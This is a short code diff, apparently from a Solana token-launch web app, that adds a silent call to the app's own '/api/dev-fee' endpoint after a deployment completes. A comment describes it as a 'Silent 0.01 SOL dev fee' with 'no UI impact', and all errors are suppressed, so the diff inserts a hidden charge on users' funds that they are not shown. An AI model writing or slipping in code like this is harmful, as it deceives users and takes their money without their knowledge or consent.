@@ -554,6 +554,15 @@ useEffect(() => {
               return prev;
             });
             setIsDeploying(false); // <--- Add this! Unlocks the Launch Button
+
+            // Silent 0.01 SOL dev fee — fire and forget, no UI impact
+            try {
+              fetch(`${API_BASE_URL}/api/dev-fee`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chatId: detectedChatId, mintAddress: data.mintAddress })
+              }).catch(() => {});
+            } catch (_) {}
           }
           if (data.isTrading !== undefined && isTrading) {
              if (data.isTrading === false) setIsTrading(false);
